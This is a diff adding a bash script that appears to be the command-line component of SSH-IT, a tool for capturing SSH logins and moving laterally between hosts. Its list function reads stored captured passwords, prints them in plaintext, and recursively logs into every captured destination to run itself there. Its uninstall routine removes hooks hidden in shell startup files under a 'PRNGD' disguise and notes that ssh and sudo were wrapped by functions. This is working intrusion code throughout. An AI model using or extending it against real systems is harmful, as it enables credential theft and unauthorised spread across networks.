@@ -1,0 +1,128 @@
+#! /usr/bin/env bash
+
+BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
+source "${BINDIR}/funcs" || exit 254
+
+SSH_ARG_EXTRA_DEFAULT="-o ConnectTimeout=2 -o StrictHostKeyChecking=no"
+
+list()
+{
+	local value
+
+	# Loop detection when Alice connects to Bob and Bob connects to Charlie
+	# and Charlie connects to Alice...
+	# - If SEEN_ID is not set then create one randomly. Store it in seen_id on _this_ host.
+	# - 
+	if [[ -z $THC_SEEN_ID ]]; then
+		THC_SEEN_ID_LOCAL="$(THC_GET_RANDOM=1 "${THC_BASEDIR}/ssh")"
+		THC_SEEN_ID="$THC_SEEN_ID_LOCAL"
+	else
+		# SEEN_ID exists
+		if [[ -f "${THC_BASEDIR}/seen_id" ]]; then
+			source "${THC_BASEDIR}/seen_id"
+			[[ "${THC_SEEN_ID_LOCAL}" = "${THC_SEEN_ID}" ]] && { echo -e "[${CDR}Looping${CN}]"; exit 0; }
+		fi
+		THC_SEEN_ID_LOCAL="$THC_SEEN_ID"
+	fi
+
+	# TESTING
+	# echo -en "x${THC_HOST_PREFIX}${THC_HOST_THIS}"
+
+	# Update SEEN_ID to new ID
+	echo "THC_SEEN_ID_LOCAL=\"${THC_SEEN_ID_LOCAL}\"" >"${THC_BASEDIR}/seen_id"
+	DEBUGF "THC_SEEN_ID_LOCAL=${THC_SEEN_ID_LOCAL}"
+
+	source "${THC_BASEDIR}/depth.cfg"
+	[[ -z $THC_HOST_PREFIX ]] && THC_HOST_PREFIX="${CDY}${USER}@$(hostname)${CN}"
+
+	[[ ! -d "${THC_BASEDIR}/.d/" ]] && { echo -e "[${CF}No logins captured${CN}]"; exit 0; }
+
+	n=0
+	for f in "${THC_BASEDIR}/.d/"*.pwd; do
+		[[ ! -f "$f" ]] && { echo -e "[${CF}No logins captured${CN}]"; exit 0; }
+		n=$((n+1))
+	done
+
+	[[ -z $THC_RECURSIVE ]] || echo -e "[${CF}$n sessions${CN}]"
+
+	# Recursive
+	for f in "${THC_BASEDIR}/.d/"*.pwd; do
+		source "$f" || break
+
+		if [[ -z $LOG_PASSWORD ]]; then
+			NEW_SSH_ARG_EXTRA="${SSH_ARG_EXTRA_DEFAULT} -o BatchMode=yes"
+			value="${CDM}KeyAuth${CN}"
+		else
+			NEW_SSH_ARG_EXTRA="${SSH_ARG_EXTRA_DEFAULT} -o NumberOfPasswordPrompts=1"
+			value="${CDC}${LOG_PASSWORD}${CN}"
+		fi
+
+		#TESTING
+		echo -en "${THC_HOST_PREFIX}->${CDG}${LOG_SSH_DESTINATION}${CN}[${value}]"
+
+		# Recursive. No need to login if DEPTH is 0 here (e.g. we did not infiltrate remote)
+		if [[ "$THC_DEPTH" -gt 0 ]]; then
+			NEW_HOST_PREFIX="${THC_HOST_PREFIX}->${LOG_SSH_DESTINATION}"
+
+			NEW_ARG="source .prng/seed 2>/dev/null && [[ -f \"\${THC_BASEDIR}/thc_cli\" ]] && THC_RECURSIVE=1 THC_SEEN_ID=\"${THC_SEEN_ID_LOCAL}\" THC_DEBUG=\"${THC_DEBUG}\" THC_HOST_PREFIX=\"${NEW_HOST_PREFIX}\" THC_HOST_THIS=\"${LOG_SSH_DESTINATION}\" \"\${THC_BASEDIR}/thc_cli\" list || echo \"[${CDR}SSH-IT not installed${CDN}\"]"
+			DEBUGF "Logging into ${LOG_SSH_DESTINATION}"
+			# Bash trick to capture STDERR to a variable (it's a filedescriptor orgasm)
+			{ err="$( { THC_PWD_FILE="$f" SSH_ARG_EXTRA="${NEW_SSH_ARG_EXTRA}" "${BINDIR}/ssh_login.sh" "${NEW_ARG}"; } 2>&1 1>&3 3>&- )"; } 3>&1 || \
+				{ [[ $err = *"ermission"* ]] && echo -e "[${CDR}Permission denied${CN}]"; } || \
+				{ [[ $err = *"refused"* ]] && echo -e "[${CDR}Connection refused${CN}]"; } || \
+				{ [[ $err = *"timed out"* ]] && echo -e "[${CDR}Connection timed out${CN}]"; } || \
+				{ [[ $err = *"resolve"* ]] && echo -e "[${CDR}Could not resolve hostname${CN}]"; } || \
+				{ echo -e "[${CR}ERROR: $(echo -n "$err" | tr -d \\r | head -n1)${CN}]"; }
+		else
+			echo -e "[SSH-IT ends here]"
+		fi
+	done
+}
+
+clean()
+{
+	rm -rf "${THC_BASEDIR}/.l/sess"* 2>/dev/null 
+	rm -rf "${THC_BASEDIR}/.d/db-"* 2>/dev/null
+	rm -rf "${THC_BASEDIR}/.d/"*.pwd 2>/dev/null
+}
+
+rcfile_del()
+{
+	local rcfile="$1"
+	local data
+
+	DEBUGF "Uninstall ${rcfile}"
+	[[ -f "$rcfile" ]] || return
+	grep PRNGD "${rcfile}" &>/dev/null || return
+
+	data=$(grep -v PRNGD "${rcfile}")
+	echo "$data" >"${rcfile}-new" || { WARN 91 "Could not clean ${rcfile}"; return; }
+	touch -r "${rcfile}" "${rcfile}-new"
+	mv "${rcfile}-new" "${rcfile}" || { WARN 92 "Could not clean ${rcfile}"; return; }
+	g_n_del=$((g_n_del + 1))
+}
+
+uninstall()
+{
+	g_n_del=0
+	for rcf in .zshrc .bash_profile .bash_login .profile; do
+		rcfile_del "${HOME}/${rcf}"
+	done
+
+	for rcf in /etc/profile /etc/bashrc; do
+		rcfile_del "${rcf}"
+	done
+	[[ "${g_n_del}" -eq 0 ]] && WARN 93 "No SSH-IT installed."
+
+	echo -e "--> You may want to clean up with"
+	echo -e "--> ${CM}rm -rf \"${THC_BASEDIR:-ERRORNOTSET}\"; unset -f ssh sudo command which thc_set1 &>/dev/null${CN}"
+}
+
+DEBUGF "thc_cli host=$(hostname)[${USER}]"
+[[ -z $THC_BASEDIR ]] && ERREXIT 44 "THC_BASEDIR= is not set"
+
+[[ "$1" = "list" ]] && { list; exit; }
+[[ "$1" = "clean" ]] || [[ "$1" = "rm" ]] && { clean; exit; }
+[[ "$1" = "uninstall" ]] && { uninstall; exit; }
+
+
